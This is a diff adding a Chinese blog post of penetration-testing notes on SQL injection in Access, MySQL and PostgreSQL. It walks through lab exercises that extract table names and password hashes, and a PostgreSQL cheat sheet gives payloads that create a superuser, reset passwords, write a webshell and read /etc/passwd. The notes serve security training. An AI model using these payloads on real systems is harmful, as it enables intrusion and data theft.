@@ -1,0 +1,1029 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lishang520.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="13 、SQL注入&amp;Mysql&amp;Postsql&amp;Access 1、不同数据库类型差异讲解  sql查询语句不同 架构和权限的划分也不同（数据库的用户是高权限用户还是低权限用户）  2、SQL注入与数据库类型关系 3、Access&amp;Mysql&amp;PostgreSQL 4.实战中如何判断当前注入点数据库">
+<meta property="og:type" content="article">
+<meta property="og:title" content="13-15、渗透测试(xiaodi)">
+<meta property="og:url" content="https://lishang520.github.io/2021/08/10/13-15%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/index.html">
+<meta property="og:site_name" content="painter&#39;s Blog">
+<meta property="og:description" content="13 、SQL注入&amp;Mysql&amp;Postsql&amp;Access 1、不同数据库类型差异讲解  sql查询语句不同 架构和权限的划分也不同（数据库的用户是高权限用户还是低权限用户）  2、SQL注入与数据库类型关系 3、Access&amp;Mysql&amp;PostgreSQL 4.实战中如何判断当前注入点数据库">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210729122300887.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210729122534689.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210729122706545.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210729123659999.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210729124115953.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210729124808993.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210729125307489.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210729154748904.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210729154740600.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210729164800102.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210729174705548.png">
+<meta property="og:image" content="https://lishang520.github.io/source/images/image-20210729174730745.png">
+<meta property="article:published_time" content="2021-08-10T11:37:41.000Z">
+<meta property="article:modified_time" content="2021-08-10T11:49:11.318Z">
+<meta property="article:author" content="painter">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lishang520.github.io/source/images/image-20210729122300887.png">
+
+<link rel="canonical" href="https://lishang520.github.io/2021/08/10/13-15%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>13-15、渗透测试(xiaodi) | painter's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?24a57553e96b4b8b803c9794fd76b400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">painter's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-关于我">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于我</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-友情链接">
+
+    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>友情链接</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/lishang520/" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lishang520.github.io/2021/08/10/13-15%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/%E5%A4%B4%E5%83%8F.jpg">
+      <meta itemprop="name" content="painter">
+      <meta itemprop="description" content="painter的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="painter's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          13-15、渗透测试(xiaodi)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-10 19:37:41 / 修改时间：19:49:11" itemprop="dateCreated datePublished" datetime="2021-08-10T19:37:41+08:00">2021-08-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/08/10/13-15%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/10/13-15%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>19k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>17 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>13 、SQL注入&amp;Mysql&amp;Postsql&amp;Access</p>
+<p>1、不同数据库类型差异讲解</p>
+<ul>
+<li>sql查询语句不同</li>
+<li>架构和权限的划分也不同（数据库的用户是高权限用户还是低权限用户）</li>
+</ul>
+<p>2、SQL注入与数据库类型关系</p>
+<p>3、Access&amp;Mysql&amp;PostgreSQL</p>
+<p>4.实战中如何判断当前注入点数据库</p>
+<span id="more"></span>
+
+
+<ul>
+<li>脚本语言组合<ul>
+<li>php   mysql</li>
+<li>asp   access</li>
+</ul>
+</li>
+<li>端口扫描，namp</li>
+</ul>
+<p>sql注入-Fuzz字典使用说明</p>
+<ul>
+<li>适用场景：手工注入、手工+工具注入</li>
+<li>工具和字典<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a></li>
+</ul>
+</li>
+</ul>
+<p>Access联合&amp;偏移注入</p>
+<ul>
+<li><p>特点：小型的数据库，现在很少见了，一般搭配sap的脚本语言</p>
+</li>
+<li><p>Access数据库架构</p>
+<ul>
+<li>表名<ul>
+<li>列名<ul>
+<li>数据</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>mysql数据库架构</p>
+<ul>
+<li>数据库A = 网站A<ul>
+<li>表名<ul>
+<li>列名<ul>
+<li>数据</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>数据库B=网站B<ul>
+<li>表名<ul>
+<li>列名<ul>
+<li>数据</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Access数据库和mysql数据库的区别</p>
+<ul>
+<li>根据架构不同，Access只有一个数据库，而mysql有多个数据库，所以Access第一步猜解表名就可以了，而mysql因为有多个数据库，所以第一步是猜解当前数据库的数据库名字</li>
+<li>Access是暴力猜解，所以能否猜解出表名、列名取决于字典的丰富程度，所以经常会导致猜解不出表名、列名的情况，而mysql则不是这样，mysql有一个总的数据库，所有的东西都在里面，都有规律，所以不需要暴力猜解</li>
+</ul>
+</li>
+<li><p>Access联合注入</p>
+<ul>
+<li><p>查字段数： order by 22 </p>
+</li>
+<li><p>开始猜解表名，在 order by 22 后面拼接  from admin    此时这里的admin是我们猜解的表名，如果admin不存在。则会报错</p>
+<ul>
+<li>技巧：这里可以使用burp。将admin设置为变量。然后组合字典进行猜解</li>
+<li>127.0.0.1/Production/PRODUCT_DETAIL.asp?id=1513%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%20from%20admin</li>
+</ul>
+</li>
+<li><p>开始猜解列名：如果表名猜解出来了的话</p>
+<ul>
+<li>```python<br>#猜解一个字段<br><a target="_blank" rel="noopener" href="http://127.0.0.1/Production/PRODUCT_DETAIL.asp?id=1513%20union%20select%201,2,password,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%20from%20admin">http://127.0.0.1/Production/PRODUCT_DETAIL.asp?id=1513%20union%20select%201,2,password,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%20from%20admin</a>#猜解2个字段<br><a target="_blank" rel="noopener" href="http://127.0.0.1/Production/PRODUCT_DETAIL.asp?id=1513%20union%20select%201,2,admin,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%20from%20admin">http://127.0.0.1/Production/PRODUCT_DETAIL.asp?id=1513%20union%20select%201,2,admin,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%20from%20admin</a><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">- Access偏移注入：解决能暴力猜解出表名，但是猜不出列名的情况</span><br><span class="line"></span><br><span class="line">  - 要求：会套用模板即可</span><br><span class="line"></span><br><span class="line">  - 代码：</span><br><span class="line"></span><br><span class="line">    - ```python</span><br><span class="line">      偏移注入：解决表名获取到而列名获取不到情况</span><br><span class="line">      使用方法：</span><br><span class="line">      	1、首先可以观察到一共有22个字段，我们接着使用星号 *  代替22，然后访问该页面，若报错，接着继续往前删掉数字，22 -&gt; 1 一直往前删除，直到页面不报错</span><br><span class="line">          2、此处发现，删除到16的时候，页面正常，相当于 * 号占了6个位置</span><br><span class="line">          3、接着使用第三条语句开始二级偏移，* from (admin as a inner join admin as b on a.id = b.id)   ，并且接着继续往前删除6个数字，这里就是删到10，然后查看页面和源代码，看字段的值有没有爆出来，如果没有爆出来，就进行下一步三级偏移</span><br><span class="line">          4、同理，继续往前删除6个数字，组合语句 a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)   ，查看页面和源代码是否有我们需要的内容爆出</span><br><span class="line">          </span><br><span class="line">          </span><br><span class="line">      union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</span><br><span class="line">      union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin</span><br><span class="line">      union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)</span><br><span class="line">      union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)</span><br><span class="line">      </span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<p>SQL注入-Mysql高低版本联合注入</p>
+<ul>
+<li><p>常用查询函数</p>
+<ul>
+<li>database()      数据库名</li>
+<li>version()      数据库版本</li>
+<li>user()      数据库用户</li>
+<li>@@version_compile_os  操作系统</li>
+</ul>
+</li>
+<li><p>低版本： &lt;Mysql 5.0  </p>
+<ul>
+<li>特性：属于暴力猜解 ，不带有information_schema ，所以只能暴力猜解</li>
+</ul>
+</li>
+<li><p>高版本</p>
+<ul>
+<li>特性：有规律的猜解，带有数据库名information_schema,其存储着所有的数据库的名字、表名、列名的信息</li>
+<li>查询函数<ul>
+<li>information_schema.tables  下的l列table_name 储存有所有的表名</li>
+<li>information_schema.columns  下的列column_name 储存有所有的列名</li>
+<li>information_schema..schemata 下的schema_name   储存有所有的数据库的名字</li>
+<li>table_schema 数据库名<ul>
+<li>易错点：一定要注意，是table_schema ，并不是schema_name</li>
+</ul>
+</li>
+<li>table_name  表名</li>
+<li>column_name 列名</li>
+</ul>
+</li>
+<li>实例：墨者靶场：<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe">SQL手工注入漏洞测试(MySQL数据库)_SQL注入_在线靶场_墨者学院_专注于网络安全人才培养 (mozhe.cn)</a><ul>
+<li>判断参数是字符型还是数字型：<a target="_blank" rel="noopener" href="http://219.153.49.228:43902/new_list.php?id=1%E2%80%99and%201=1">http://219.153.49.228:43902/new_list.php?id=1%E2%80%99and%201=1</a><ul>
+<li>报错，所以不是字符型，那他是数字型</li>
+<li><img src="/source/images/image-20210729122300887.png" alt="image-20210729122300887"></li>
+</ul>
+</li>
+<li>查询长度：<a target="_blank" rel="noopener" href="http://219.153.49.228:43902/new_list.php?id=1%20order%20by%204">http://219.153.49.228:43902/new_list.php?id=1%20order%20by%204</a><ul>
+<li>结果为4</li>
+</ul>
+</li>
+<li>联合查询：<a target="_blank" rel="noopener" href="http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,2,3,4">http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,2,3,4</a><ul>
+<li>易错点：需要将union前面的语句置错，比如改成 -1</li>
+<li><img src="/source/images/image-20210729122534689.png" alt="image-20210729122534689"></li>
+</ul>
+</li>
+<li>开始在显示位2的位置sql注入查询数据库版本：<a target="_blank" rel="noopener" href="http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,version(),3,4">http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,version(),3,4</a><ul>
+<li><img src="/source/images/image-20210729122706545.png" alt="image-20210729122706545"></li>
+</ul>
+</li>
+<li>因为是版本大于或等于5.0，所以可以hi用information_schema数据库进行注入</li>
+<li>获取数据库名：<a target="_blank" rel="noopener" href="http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,2,database(),4">http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,2,database(),4</a><ul>
+<li>得到：mozhe_Discuz_StormGroup</li>
+</ul>
+</li>
+<li>获取一个表名：219.153.49.228:43902/new_list.php?id=-1 union select 1,2,table_name,4 from information_schema.tables where table_schema = “mozhe_Discuz_StormGroup”<ul>
+<li><img src="/source/images/image-20210729123659999.png" alt="image-20210729123659999"></li>
+</ul>
+</li>
+<li>获取所有表名：group_concat(table_name)<ul>
+<li>219.153.49.228:43902/new_list.php?id=-1 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema = “mozhe_Discuz_StormGroup”</li>
+<li><img src="/source/images/image-20210729124115953.png" alt="image-20210729124115953"></li>
+</ul>
+</li>
+<li>获取所有列名<ul>
+<li>这里根据上面查到的表，可以发现表StormGroup_member是存储用户数据的，所以我们就获取它里面的列</li>
+<li><a target="_blank" rel="noopener" href="http://219.153.49.228:43902/new_list.php?id=-1">http://219.153.49.228:43902/new_list.php?id=-1</a> union select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema = “mozhe_Discuz_StormGroup”</li>
+<li>易错点：这里因为information_schema.columns里储存了所有的列，所以需要将information_schema.tables换成information_schema.columns</li>
+<li><img src="/source/images/image-20210729124808993.png" alt="image-20210729124808993"></li>
+</ul>
+</li>
+<li>获取数据：<a target="_blank" rel="noopener" href="http://219.153.49.228:43902/new_list.php?id=-1">http://219.153.49.228:43902/new_list.php?id=-1</a> union select 1,password,name,4 from StormGroup_member<ul>
+<li>易错点：这里直接填上字段，然后后面跟上from + 表名即可</li>
+<li><img src="/source/images/image-20210729125307489.png" alt="image-20210729125307489"></li>
+</ul>
+</li>
+<li>密码进行md5解密，得到：mozhe   738426<ul>
+<li>注意，因为这个获取到的账号被禁用了，所以我们可以使用group_concat()获取所有的账户和密码，发现第二个账户和密码可以成功登录</li>
+<li><a target="_blank" rel="noopener" href="http://219.153.49.228:43902/new_list.php?id=-1">http://219.153.49.228:43902/new_list.php?id=-1</a> union select 1,group_concat(password),group_concat(name),4 from StormGroup_member</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>SQL注入-PostgreSQL同理联合注入：和mysql类似</p>
+<ul>
+<li><p>特性：</p>
+<ul>
+<li><p>select 的1,2,3,4   全部换成null</p>
+</li>
+<li><p>select null,null,null,null   并不会显示显示位，而是页面正常显示，所以在插入查询语句，比如version() 需要在4个null的位置进行测试，看哪个位置会爆出数据（前提：union前面的语句要置错）</p>
+</li>
+</ul>
+</li>
+<li><p>语法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Postgresql是一款中小型数据库，经常与PHP一起使用。</span><br><span class="line"></span><br><span class="line">数据库判断</span><br><span class="line">+<span class="keyword">and</span>+<span class="number">1</span>::<span class="built_in">int</span>=<span class="number">1</span>-</span><br><span class="line">返回正常即为Postgresql数据库</span><br><span class="line"></span><br><span class="line">常用注入语句</span><br><span class="line">数据库版本</span><br><span class="line">+<span class="keyword">and</span>+<span class="number">1</span>=cast(version() <span class="keyword">as</span> <span class="built_in">int</span>)-</span><br><span class="line">判断当前用户</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=cast(user||<span class="number">123</span> <span class="keyword">as</span> <span class="built_in">int</span>)</span><br><span class="line">判断字段数</span><br><span class="line">order by</span><br><span class="line">联合注入</span><br><span class="line">用法和oracle相似</span><br><span class="line"></span><br><span class="line">数据库版本信息</span><br><span class="line">union select null,version(),null </span><br><span class="line">用户权限</span><br><span class="line">union select null,current_schema(),null</span><br><span class="line">数据库名称</span><br><span class="line">union select null,current_database(),null</span><br><span class="line">表名</span><br><span class="line">union select null,relname,null <span class="keyword">from</span> pg_stat_user_tables</span><br><span class="line">列名</span><br><span class="line">union select null,column_name,null <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;表名&#x27;</span></span><br><span class="line">查看数据库账号密码</span><br><span class="line">union select null,usename|char(<span class="number">124</span>)|passwd,null <span class="keyword">from</span> pg_shadow</span><br><span class="line">||连接字符串</span><br><span class="line"></span><br><span class="line">char(<span class="number">124</span>)为|</span><br><span class="line"></span><br><span class="line">获得结果例子：admin|password</span><br><span class="line"></span><br><span class="line">创建用户</span><br><span class="line">;create user test <span class="keyword">with</span> superuser password <span class="string">&#x27;test&#x27;</span>-- </span><br><span class="line">修改postgres的用户密码为<span class="keyword">pass</span></span><br><span class="line">;alter user postgres <span class="keyword">with</span> password <span class="string">&#x27;pass&#x27;</span></span><br><span class="line">写shell</span><br><span class="line">方法一</span><br><span class="line">依次执行如下三个命令</span><br><span class="line"></span><br><span class="line">;create  table shell(shell text <span class="keyword">not</span> null);</span><br><span class="line">;insert into shell values(一句话木马);</span><br><span class="line">;copy shell(shell) to <span class="string">&#x27;/www/shell.php&#x27;</span>;</span><br><span class="line">这样就会将一句话木马写到，www目录下的shell.php文件中</span><br><span class="line"></span><br><span class="line">方法二</span><br><span class="line">;copy (select <span class="string">&#x27;一句话木马&#x27;</span>) to <span class="string">&#x27;/www/shell/php&#x27;</span>;</span><br><span class="line">读文件</span><br><span class="line">pg_read_file(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="number">1</span>,<span class="number">20</span>)	<span class="comment">#读文件前20行</span></span><br></pre></td></tr></table></figure></li>
+<li><p>实战墨者靶场：<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/86">SQL手工注入漏洞测试(PostgreSQL数据库)_SQL注入_在线靶场_墨者学院_专注于网络安全人才培养 (mozhe.cn)</a></p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="http://219.153.49.228:47981/new_list.php?id=1">http://219.153.49.228:47981/new_list.php?id=1</a> order by 4      字段数为4</p>
+</li>
+<li><p>查询数据库版本：<a target="_blank" rel="noopener" href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,version(),null</p>
+</li>
+<li><p>查询数据库名：<a target="_blank" rel="noopener" href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,current_database(),null</p>
+<ul>
+<li>得到数据库名：mozhedvcms</li>
+</ul>
+</li>
+<li><p>查询表名：<a target="_blank" rel="noopener" href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,relname,null from pg_stat_user_tables</p>
+<ul>
+<li>获取到的表名 notice,这样默认获取到的是第一个表名</li>
+<li>易错点：该语句固定搭配，不需要修改</li>
+</ul>
+</li>
+<li><p>获取所有的表名：逐个获取，通过修改offset后面的数字，0，1，2，3….  获取所有的表名</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,relname,null from pg_stat_user_tables limit 1 offset 0</li>
+<li>获取的表名如下：notice    reg_users   </li>
+</ul>
+</li>
+<li><p>查询列名：<a target="_blank" rel="noopener" href="http://219.153.49.228:47981/new_list.php?id=-1">http://219.153.49.228:47981/new_list.php?id=-1</a> union select null,null,column_name,null from information_schema.columns where table_name=’reg_users’               得到列：id</p>
+<ul>
+<li>易错点：该语句需要修改上一步获取到的表名 reg_users，这里默认获取到的是第一个列名</li>
+</ul>
+</li>
